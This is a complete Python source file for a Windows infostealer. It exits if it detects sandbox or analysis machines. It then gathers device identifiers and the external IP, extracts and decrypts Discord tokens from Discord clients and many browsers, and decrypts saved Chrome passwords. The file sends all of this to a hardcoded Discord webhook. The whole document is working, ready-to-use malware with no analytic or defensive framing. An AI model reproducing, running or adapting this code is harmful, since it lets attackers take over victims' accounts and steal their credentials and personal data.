import base64
import json
import os
import re
import requests
import socket
import subprocess
import sys
import uuid
import sqlite3
import shutil
from datetime import timezone, datetime, timedelta
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from discord import Embed, SyncWebhook

class AntiDebug:
    def __init__(self):
        self.blackListedUsers = ["WDAGUtilityAccount", "DefaultAccount", "WKUDF"]
        self.blackListedPCNames = ["DESKTOP-QVM0EQB", "DESKTOP-NAWIG6L", "WKUDF"]
        self.blackListedHWIDS = [
            '6F3CA07F-45C3-44B1-9A3A-9C8382550B00',
            'A65BB4B2-EC1F-4A88-B78D-D38F37D3AE50'
        ]

    def checks(self):
        debugging = False

        def getHWID() -> str:
            try:
                cmd = 'wmic csproduct get uuid'
                uuid = str(subprocess.check_output(cmd))
                pos1 = uuid.find("\\n") + 2
                uuid = uuid[pos1:-15]
                return uuid
            except subprocess.CalledProcessError:
                return ""

        def getPCName() -> str:
            return os.getenv("COMPUTERNAME")

        def getUserName() -> str:
            return os.getenv("username")

        if getUserName() in self.blackListedUsers:
            debugging = True
        if getPCName() in self.blackListedPCNames:
            debugging = True
        if getHWID() in self.blackListedHWIDS:
            debugging = True

        return debugging

class DeviceChecker:
    def __init__(self):
        self.hwid = self.get_hwid()
        self.pc_name = self.get_pc_name()
        self.username = self.get_username()
        self.ip_address = self.get_ip_address()
        self.mac_address = self.get_mac_address()

    def get_hwid(self):
        try:
            cmd = 'wmic csproduct get uuid'
            uuid = str(subprocess.check_output(cmd))
            pos1 = uuid.find("\\n") + 2
            uuid = uuid[pos1:-15]
            return uuid
        except subprocess.CalledProcessError:
            return "Unknown"

    def get_pc_name(self):
        return os.getenv("COMPUTERNAME")

    def get_username(self):
        return os.getenv("username")

    def get_ip_address(self):
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        return ip_address

    def get_mac_address(self):
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        return mac

    def get_device_info(self):
        return {
            "hwid": self.hwid,
            "pc_name": self.pc_name,
            "username": self.username,
            "ip_address": self.ip_address,
            "mac_address": self.mac_address
        }

def fetch_external_ip():
    response = requests.get('https://api.ipify.org?format=json')
    ip = response.json().get('ip')
    return ip

class extract_tokens:
    def __init__(self) -> None:
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

        self.tokens, self.uids = [], []

        self.extract()

    def extract(self) -> None:
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            _discord = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'):
                    continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(self.regexp_enc, line):
                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
                            
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return "Failed to decrypt password"

    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path):
            return
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def validate_token(self, token: str) -> bool:
        r = requests.get(self.base_url, headers={'Authorization': token})
        if r.status_code == 200:
            return True
        return False

    def get_tokens(self) -> list:
        return self.tokens

class PasswordDecryptor:
    def __init__(self):
        self.local_state_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Local State')
        self.db_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'default', 'Login Data')
        self.master_key = self.get_master_key()

    def get_master_key(self):
        with open(self.local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        return CryptUnprotectData(master_key, None, None, None, 0)[1]

    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return "Failed to decrypt password"

    def extract_passwords(self):
        if not os.path.exists(self.db_path):
            return []

        shutil.copy2(self.db_path, "Loginvault.db")
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        login_data = cursor.fetchall()
        conn.close()
        os.remove("Loginvault.db")

        credentials = []
        for url, username, password in login_data:
            if password:
                decrypted_password = self.decrypt_password(password, self.master_key)
                credentials.append({
                    'origin_url': url,
                    'username': username,
                    'password': decrypted_password
                })

        return credentials

def main():
    # Anti-debugging checks
    anti_debug = AntiDebug()
    if anti_debug.checks():
        sys.exit()

    # Device information extraction
    device_checker = DeviceChecker()
    device_info = device_checker.get_device_info()
    device_info['external_ip'] = fetch_external_ip()

    # Token extraction
    token_extractor = extract_tokens()
    tokens = token_extractor.get_tokens()

    # Password extraction
    password_decryptor = PasswordDecryptor()
    passwords = password_decryptor.extract_passwords()

    # Sending data to the Discord webhook
    webhook_url = 'https://discord.com/api/webhooks/1398613257736163458/yH9MVCPfKrNPUM5_Sjno69IM1LULqftJCbGZeNYeTD7TaDOfxJauXH_Dg0fB6N5MOF8G'
    webhook = SyncWebhook.from_url(webhook_url)

    embed = Embed(title="Device Information", description="Collected Device Information", color=0x00ff00)
    for key, value in device_info.items():
        embed.add_field(name=key, value=value, inline=False)

    webhook.send(embed=embed)

    if tokens:
        embed = Embed(title="Discord Tokens", description="Collected Discord Tokens", color=0x00ff00)
        for token in tokens:
            embed.add_field(name="Token", value=token, inline=False)
        webhook.send(embed=embed)

    if passwords:
        embed = Embed(title="Chrome Passwords", description="Collected Chrome Passwords", color=0x00ff00)
        for cred in passwords:
            embed.add_field(name=f"Site: {cred['origin_url']}", value=f"Username: {cred['username']} | Password: {cred['password']}", inline=False)
        webhook.send(embed=embed)

if __name__ == "__main__":
    main()
